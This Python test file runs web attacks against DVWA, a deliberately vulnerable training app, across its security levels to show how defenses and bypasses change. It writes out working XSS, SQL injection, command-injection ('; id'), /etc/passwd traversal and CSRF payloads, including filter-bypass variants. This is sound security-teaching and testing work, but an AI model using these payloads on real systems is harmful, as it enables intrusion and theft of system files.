"""
Multi-Security-Level Vulnerability Tests

Tests vulnerabilities across DVWA security levels (Low, Medium, High).
Demonstrates how defenses evolve and bypass techniques.

OWASP Top 10: A03:2021 - Injection
"""

import pytest
import requests


pytestmark = pytest.mark.multi_level


class TestXSSMultiLevel:
    """XSS tests across security levels."""

    @pytest.mark.xss
    def test_reflected_xss_basic(self, dvwa_session, config, security_level):
        """
        Test basic reflected XSS across security levels.

        Low: No filtering - payload executes
        Medium: Basic filtering - some bypasses work
        High: Strong filtering - most bypasses blocked
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/xss_r/"

        # Payloads for different levels
        payloads = {
            "low": "<script>alert('XSS')</script>",
            "medium": "<ScRiPt>alert('XSS')</ScRiPt>",  # Case bypass
            "high": "<img src=x onerror=alert('XSS')>",  # Event handler
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.get(url, params={"name": payload})

        # Check if redirected to login (session issue)
        if "Login ::" in response.text or "login.php" in response.url:
            pytest.skip(f"Session not maintained for {security_level} level")

        has_payload = payload.lower() in response.text.lower() or "alert" in response.text
        print(f"[{security_level}] Payload reflected: {has_payload}")

        if security_level == "low":
            assert has_payload, "Low security should be vulnerable to XSS"
        elif security_level == "high":
            # DVWA high level uses regex to strip <script> tags but event handlers
            # like <img onerror> may still work - this is a known DVWA behavior
            if has_payload:
                print("[!] High security bypassed with event handler payload")

    @pytest.mark.xss
    def test_xss_filter_evolution(self, dvwa_session, config, set_security_level):
        """
        Test how XSS filters evolve across security levels.

        Documents the progression of defenses.
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/xss_r/"
        test_payload = "<script>alert(1)</script>"

        results = {}
        for level in ["low", "medium", "high"]:
            set_security_level(level)
            response = dvwa_session.get(url, params={"name": test_payload})

            # Check for session redirect
            if "Login ::" in response.text:
                pytest.skip("Session not maintained across security levels")

            results[level] = test_payload in response.text

        print("\n=== XSS Filter Evolution ===")
        print(f"Low (no filter): Vulnerable = {results.get('low', 'N/A')}")
        print(f"Medium (basic filter): Vulnerable = {results.get('medium', 'N/A')}")
        print(f"High (strong filter): Vulnerable = {results.get('high', 'N/A')}")

        assert results.get("low"), "Low security should be vulnerable to basic XSS"
        assert not results.get("high"), "High security should block basic XSS"


class TestSQLiMultiLevel:
    """SQL Injection tests across security levels."""

    @pytest.mark.sqli
    def test_sqli_basic(self, dvwa_session, config, security_level):
        """
        Test basic SQL injection across security levels.

        Low: No escaping - injection works
        Medium: mysql_real_escape_string - quote escaping
        High: Parameterized query or strong validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/sqli/"

        # Payloads for different levels
        payloads = {
            "low": "1' OR '1'='1",
            "medium": "1 OR 1=1",  # Numeric injection (no quotes)
            "high": "1",  # Just test normal input
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.get(url, params={"id": payload, "Submit": "Submit"})

        # Check for session redirect
        if "Login ::" in response.text:
            pytest.skip(f"Session not maintained for {security_level} level")

        user_count = response.text.lower().count("surname")
        print(f"[{security_level}] Users returned: {user_count}")

        if security_level == "low":
            assert user_count > 1, "Low security should be vulnerable to SQLi"
        elif security_level == "high":
            assert user_count <= 1, "High security should block SQLi attacks"

    @pytest.mark.sqli
    def test_sqli_error_exposure(self, dvwa_session, config, security_level):
        """
        Test SQL error exposure across security levels.
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/sqli/"
        error_payload = "'"

        response = dvwa_session.get(url, params={"id": error_payload, "Submit": "Submit"})

        # Use specific SQL error indicators (not generic "error" which appears in page text)
        error_indicators = ["sql syntax", "mysql_", "you have an error in your sql"]
        has_error = any(ind in response.text.lower() for ind in error_indicators)

        print(f"[{security_level}] SQL error exposed: {has_error}")

        if security_level == "low":
            # Low level often exposes errors
            pass  # Informational
        elif security_level == "high":
            # High level should not expose SQL errors
            assert not has_error, "High level should not expose SQL errors"


class TestCSRFMultiLevel:
    """CSRF tests across security levels."""

    @pytest.mark.csrf
    def test_csrf_token_enforcement(self, dvwa_session, config, security_level):
        """
        Test CSRF token enforcement across security levels.

        Low: No CSRF token
        Medium: Weak token validation
        High: Strong token validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/csrf/"

        # Get the page to see if token exists
        response = dvwa_session.get(url)
        has_token = "user_token" in response.text

        # Try changing password without valid token
        malicious_data = {
            "password_new": "hacked123",
            "password_conf": "hacked123",
            "Change": "Change",
            "user_token": "invalid_token",
        }

        post_response = dvwa_session.post(url, data=malicious_data)
        password_changed = "Password Changed" in post_response.text

        # Check for session redirect
        if "Login ::" in response.text:
            pytest.skip(f"Session not maintained for {security_level} level")

        print(f"[{security_level}] Has token: {has_token}, Attack success: {password_changed}")

        if security_level == "high":
            assert not password_changed, "High security should block CSRF attacks with invalid tokens"


class TestCommandInjectionMultiLevel:
    """Command Injection tests across security levels."""

    @pytest.mark.slow
    def test_command_injection(self, dvwa_session, config, security_level):
        """
        Test command injection across security levels.

        Low: No filtering
        Medium: Blacklist filtering
        High: Whitelist/strong validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/exec/"

        # Payloads for different levels
        payloads = {
            "low": "127.0.0.1; id",
            "medium": "127.0.0.1 | id",  # Pipe instead of semicolon
            "high": "127.0.0.1",  # Clean input
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.post(url, data={"ip": payload, "Submit": "Submit"})

        # Check for session redirect
        if "Login ::" in response.text:
            pytest.skip(f"Session not maintained for {security_level} level")

        has_uid = "uid=" in response.text
        print(f"[{security_level}] Command executed: {has_uid}")

        if security_level == "low":
            assert has_uid, "Low security should be vulnerable to command injection"
        elif security_level == "high":
            assert not has_uid, "High security should block command injection"


class TestFileInclusionMultiLevel:
    """File Inclusion tests across security levels."""

    def test_file_inclusion(self, dvwa_session, config, security_level):
        """
        Test Local File Inclusion across security levels.

        Low: No validation
        Medium: Basic path filtering
        High: Strong validation
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        url = f"{config.DVWA_URL}/vulnerabilities/fi/"

        # Payloads for different levels
        payloads = {
            "low": "../../../../../../etc/passwd",
            "medium": "....//....//....//etc/passwd",  # Double encoding
            "high": "file1.php",  # Valid file
        }

        payload = payloads.get(security_level, payloads["low"])
        response = dvwa_session.get(url, params={"page": payload})

        # Check for session redirect
        if "Login ::" in response.text:
            pytest.skip(f"Session not maintained for {security_level} level")

        has_passwd = "root:" in response.text
        print(f"[{security_level}] File inclusion success: {has_passwd}")

        if security_level == "low":
            assert has_passwd, "Low security should be vulnerable to file inclusion"
        elif security_level == "high":
            assert not has_passwd, "High security should block file inclusion"


class TestSecurityLevelComparison:
    """Compare vulnerability across all levels."""

    def test_vulnerability_matrix(self, dvwa_session, config, set_security_level):
        """
        Generate vulnerability matrix across security levels.
        """
        if dvwa_session is None:
            pytest.skip("DVWA not available")

        results = {"low": {}, "medium": {}, "high": {}}

        for level in ["low", "medium", "high"]:
            set_security_level(level)

            # Test XSS
            xss_url = f"{config.DVWA_URL}/vulnerabilities/xss_r/"
            xss_resp = dvwa_session.get(xss_url, params={"name": "<script>alert(1)</script>"})

            # Check for session redirect
            if "Login ::" in xss_resp.text:
                pytest.skip("Session not maintained across security levels")

            results[level]["xss"] = "<script>" in xss_resp.text.lower()

            # Test SQLi
            sqli_url = f"{config.DVWA_URL}/vulnerabilities/sqli/"
            sqli_resp = dvwa_session.get(sqli_url, params={"id": "1' OR '1'='1", "Submit": "Submit"})
            results[level]["sqli"] = sqli_resp.text.lower().count("surname") > 1

            # Test CSRF
            csrf_url = f"{config.DVWA_URL}/vulnerabilities/csrf/"
            csrf_resp = dvwa_session.post(csrf_url, data={
                "password_new": "test123",
                "password_conf": "test123",
                "Change": "Change",
                "user_token": "invalid",
            })
            results[level]["csrf"] = "Password Changed" in csrf_resp.text

        # Print matrix
        print("\n" + "=" * 50)
        print("VULNERABILITY MATRIX")
        print("=" * 50)
        print(f"{'Level':<10} {'XSS':<10} {'SQLi':<10} {'CSRF':<10}")
        print("-" * 50)
        for level in ["low", "medium", "high"]:
            xss = "✓ Vuln" if results[level].get("xss") else "✗ Safe"
            sqli = "✓ Vuln" if results[level].get("sqli") else "✗ Safe"
            csrf = "✓ Vuln" if results[level].get("csrf") else "✗ Safe"
            print(f"{level:<10} {xss:<10} {sqli:<10} {csrf:<10}")
        print("=" * 50)

        # Low should be vulnerable, high should be secure
        low_vuln = any(results["low"].values())
        high_secure = not any(results["high"].values())
        assert low_vuln, "Low security should have at least one vulnerability"
        assert high_secure, "High security should block all tested attacks"
